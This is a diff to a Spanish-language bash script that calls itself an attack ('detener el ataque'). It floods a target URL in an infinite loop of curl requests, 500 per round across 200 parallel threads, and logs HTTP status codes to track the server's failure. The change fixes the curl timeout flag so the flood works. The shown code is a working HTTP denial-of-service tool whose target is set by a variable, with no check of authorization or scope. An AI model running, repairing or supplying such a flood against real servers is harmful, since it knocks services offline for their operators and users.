@@ -22,8 +22,8 @@ echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."
 # Inundación infinita con hilos mucho más pesados y sin esperas
 while true; do
     # -P 200: 200 hilos simultáneos
-    # --connection-timeout 2: No perder tiempo con conexiones lentas
-    seq 500 | xargs -n 1 -P 200 curl -s -L --connection-timeout 2 -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
+    # --connect-timeout 2: No perder tiempo con conexiones lentas
+    seq 500 | xargs -n 1 -P 200 curl -s -L --connect-timeout 2 -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
     
     # Análisis rápido de salud del servidor
     FAIL_COUNT=$(tail -n 200 /tmp/stress_results.txt | grep -c -v "200")
